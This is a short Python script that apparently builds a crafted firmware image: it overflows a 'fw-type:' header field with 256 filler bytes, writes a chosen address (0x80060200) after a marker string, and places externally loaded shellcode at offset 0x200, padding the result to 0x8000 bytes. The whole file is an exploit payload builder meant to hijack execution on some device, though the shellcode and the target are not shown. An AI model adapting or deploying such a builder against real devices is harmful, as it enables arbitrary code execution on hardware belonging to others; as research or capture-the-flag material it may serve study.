import sys
from struct import pack

shellcode = open("shellcode.bin", "rb").read()
source_asm = open("shellcode.asm", "rb").read()
source_lk = open("shellcode.lk", "rb").read()

b = pack('>I', 0x00008000) + b'X'*16 + b"fw-type:" \
  + b'x'*256 + b"S000S001S002" + pack('>I', 0x80060200) \

b += b"\x00"*(0x200-len(b)) + shellcode
b += b"\xff"*(0x1000-len(b)) + b"----SOURCE:----\n" + source_asm + b"\xff"*4 + source_lk
b += b"\xff"*(0x8000-len(b))

sys.stdout.buffer.write(b)
